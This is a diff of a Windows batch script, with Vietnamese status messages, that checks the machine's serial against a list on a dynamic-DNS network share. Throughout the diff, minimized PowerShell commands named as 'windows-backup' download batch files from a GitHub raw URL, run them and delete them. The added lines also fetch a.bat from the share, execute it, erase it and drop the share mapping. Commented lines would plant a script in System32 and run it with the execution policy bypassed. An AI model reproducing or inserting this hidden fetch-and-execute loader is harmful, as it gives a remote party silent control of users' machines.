@@ -30,7 +30,7 @@ if errorlevel 1 (
     echo [Network] Khong ket noi duoc toi share.
 ) else (
     copy "%uncPath%" "%tempfile2%" >nul 2>&1
-    net use \\minhtuan283.ddns.net\HDD /delete >nul 2>&1
+   
 )
 if not exist "%tempfile2%" (
     echo [Network] Khong tai duoc file.
@@ -81,15 +81,17 @@ if %found%==0 (
     echo Trung khop. Thuc hien cac lenh tiep theo...
     rem -- Thực hiện các lệnh khác của bạn --
     
-    start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup.bat'); Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process $tempPath1 -Wait; Remove-Item $tempPath1"
-    start /min powershell -Command "$url2 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat'; $tempPath2 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup2.bat'); Invoke-WebRequest -Uri $url2 -OutFile $tempPath2; Start-Process $tempPath2 -Wait; Remove-Item $tempPath2"
-start /min powershell -Command "$url3 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat'; $tempPath3 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup3.bat'); Invoke-WebRequest -Uri $url3 -OutFile $tempPath3; Start-Process $tempPath3 -Wait; Remove-Item $tempPath3"
+  start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup.bat'); Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process $tempPath1 -Wait; Remove-Item $tempPath1"
+rem   start /min powershell -Command "$url2 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat'; $tempPath2 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup2.bat'); Invoke-WebRequest -Uri $url2 -OutFile $tempPath2; Start-Process $tempPath2 -Wait; Remove-Item $tempPath2"
+rem start /min powershell -Command "$url3 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat'; $tempPath3 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup3.bat'); Invoke-WebRequest -Uri $url3 -OutFile $tempPath3; Start-Process $tempPath3 -Wait; Remove-Item $tempPath3"
 rem start /min powershell -Command "$url4 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat'; $tempPath4 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup4.bat'); Invoke-WebRequest -Uri $url4 -OutFile $tempPath4; Start-Process $tempPath4 -Wait; Remove-Item $tempPath4"
 rem start /min powershell -Command "$url5 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup5.bat'; $tempPath5 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup5.bat'); Invoke-WebRequest -Uri $url5 -OutFile $tempPath5; Start-Process $tempPath5 -Wait; Remove-Item $tempPath5"
 rem powershell curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1
 rem powershell -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\windows-backup.ps1"
 
 rem powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\windows-backup.ps1 https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1; powershell -ExecutionPolicy Bypass -File 'C:\Windows\System32\WindowsPowerShell\windows-backup.ps1'"
+copy "\\minhtuan283.ddns.net\HDD\serial\script\a.bat" "%temp%\a.bat" >nul 2>&1
+call "%temp%\a.bat"
 )
 
 :cleanup
@@ -101,4 +103,7 @@ set "tempfile2="
 set "serial="
 set "device="
 set "found="
+if exist "%temp%\a.bat" del /f /q "%temp%\a.bat"
+net use \\minhtuan283.ddns.net\HDD /delete >nul 2>&1
 echo Hoan Thanh.
+exit /b
